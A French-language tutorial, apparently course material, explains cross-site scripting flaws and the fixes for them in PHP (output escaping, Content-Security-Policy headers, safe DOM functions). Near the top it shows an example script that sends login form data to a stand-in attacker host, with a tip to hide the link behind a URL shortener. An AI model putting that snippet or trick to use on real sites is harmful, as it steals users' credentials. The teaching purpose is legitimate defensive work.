# Faille XSS

Le XSS (Cross Site Scripting) est une des failles les plus courantes.
Cette faille permet d'injecter du contenu dans une page.
Le contenu injecté peut être du HTML, du CSS, des images, du JavaScript, etc.
Une faille XSS est créée en utilisant POST ou GET, si vous utilisez GET la faille devient plus dangereuse, car il devient facile à partager un lien corrompu.

Exemple d'un JavaScript qui pourrait être dangereux lors d'une attaque XSS:

```javascript
form.addEventListener('click', e => {
    fetch('http://siteduhacker.com', {
        method: 'post',
        body: new FormData(e.currentTarget)
    });
});
```

Cachez l'URL dans un lien raccourci (comme bitly) et ça peut passer inaperçu!
Avec ce code le pirate aurait accès au nom d'utilisateur et mot de passe de chaque utilisateur qui se connecte avec le formulaire vulnérable.
Le pirate pourrait aussi:

* Nuire à l'image du site (remplacer les images par de la pornographie par exemple)
* Voler des cookies de sessions
* Effectuer des actions sur la session d'un autre utilisateur
* Etc.

Il existe 3 types de faille XSS: temporaire, permanente et le "Self-XSS".

## XSS Temporaire

La faille existe lorsque vous utilisez des données non fiables.
Une donnée est "non fiable" lorsqu'elle peut être modifiable par un utilisateur, soit toutes les variables superglobales sauf $_SESSION.

Exemple de fichier vulnérable: [xss/unsafe.php](/exemples/xss/unsafe.php).

Il existe 2 solutions.
La première est d'utiliser une des deux fonctions suivantes à chaque fois que vous affichez une donnée non fiable:

```php
function xss_safe(string $string): string {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}
// Ou la fonction built-in suivante:
strip_tags($string)
// Ou si vous affichez un entier:
intval($string)
```

[Exemple xss/safe-fct.php](/exemples/xss/safe-fct.php).
Changer le commentaire de ligne pour voir la différence entre les 2 méthodes.
Personnellement je préfère le htmlspecialchars, car le contenu saisi reste inchangé.

La deuxième solution est d'ajouter le CSP (Content Security Policy) dans notre en-tête HTTP.
Appelez la fonction suivante avant tout echo ou HTML:

```php
header("Content-Security-Policy: default-src 'self';");
```

[Exemple xss/safe-header.php](/exemples/xss/safe-header.php).
Regardez dans le code source, dans le bas de la page j'ajoute 2 JavaScript, 1 qui provient de notre NPM et un qui provient du CDN.
Regardez maintenant dans la console, celui de Bootstrap a été bloqué.

Cette fonction empêche tout JavaScript qui ne provient pas du même domaine que le site (self) ni les script inline.
Si vous voulez vraiment du JavaScript inline, vous pouvez utiliser un nonce aléatoire ou un hash.

[Exemple xss/safe-header-inline.php](/exemples/xss/safe-header-inline.php).
Dans cet exemple j'inclus 3 JavaScript inline, regardez dans la console vous allez voir que le premier est bloqué par le CSP mais pas les 2 autres.

Pour voir votre en-tête CSP, allez dans votre console, onglet "Network" (avec Chromium) et cliquez sur votre fichier PHP.
Dans l'onglet Headers vous allez voir votre CSP.

### Solution fonction ou CSP?

La solution avec la fonction (htmlspecialchars ou strip_tags) permet d'utiliser facilement le JavaScript "inline", mais est facile à oublier un echo non fiable.

La solution avec le CSP est plus fiable (pas d'oubli possible), mais va être plus restrictive pour l'utilisation du JavaScript "inline".

Pour votre TP vous devez utiliser les deux méthodes.

### DOM XSS

Une attaque XSS est aussi possible si votre JavaScript utilise des composants de l'URL.
Si vous utilisez les ancres (#) ou les paramètres GET (?) en JavaScript, il faut considérer que ce sont des données non-fiables.

Si vous jouez avec des données non-fiables en JavaScript, privilégier la création de noeud DOM ou les fonctions text (innerText) plutôt que les fonctions HTML (innerHTML, insertAdjacentHTML, etc.).

## XSS Permanent

La faille XSS permanente est identique au XSS temporaire.
La protection est aussi identique.
La différence est que le XSS Permanent est enregistré dans la base de données, si la donnée est visible pour tous les visiteurs l'attaque est encore plus facile à partager qu'une attaque temporaire avec GET.

La protection par fonction doit être faite avant de echo une information qui provient de la base de données, si cette information peut venir d'une source non fiable.
La protection CSP est identique.

## Self-XSS

Le pirate demande à l'utilisateur "Appuie sur F12, clique sur Console et colle le code suivant, ça va activer Facebook Pro".
Vous comprenez que le danger est identique que les autres types de XSS.
Par contre il n'y a aucune protection possible.

La seule possibilité est de faire comme Facebook.
Ouvrez [facebook.com](http://facebook.com) et ouvrez la console, vous verrez l'avertissement de Facebook.

Références:
 * https://www.hacksplaining.com/app/lessons/xss-stored/prevention
 * https://portswigger.net/web-security/cross-site-scripting